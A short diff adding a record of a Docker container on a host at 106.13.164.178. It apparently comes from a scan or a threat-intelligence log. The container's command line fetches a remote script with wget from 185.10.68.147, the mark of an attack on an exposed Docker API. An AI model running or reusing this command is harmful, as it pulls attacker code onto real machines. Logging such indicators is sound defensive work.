@@ -1,0 +1,7 @@
+106.13.164.178
+Image: sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e
+ID: 259f4ac46099f93f7659720d1ec30f6ea91c464a3a40c87422c740eaf496ce49
+Command: /bin/sh -c 'wget http://185.10.68.147/dock/main.sh --user-agent docker'Created:1596438823
+Names: 
+/naughty_lamarr
+Status: Up About an hour
